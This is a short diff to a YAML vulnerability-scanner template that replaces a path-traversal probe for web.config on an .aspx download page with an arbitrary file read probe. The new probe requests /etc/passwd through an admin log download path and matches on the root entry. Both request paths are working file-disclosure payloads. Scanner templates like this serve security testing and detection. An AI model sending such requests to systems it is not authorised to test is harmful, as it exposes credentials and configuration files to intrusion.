@@ -6,9 +6,8 @@ rules:
     request:
       cache: true
       method: GET
-      path: /HM/M_main/InformationManage/VacantDiscountDownLoad.aspx?VacantDiscountFile=../web.config
-    expression: response.status == 200 && response.body_string.contains("configuration")  && response.body_string.contains("system.web")
-expression: linux()
+      path: /admin/log/download?file=/etc/passwd
+    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+expression: linux() 
 detail:
   author: k3ppf0r
-
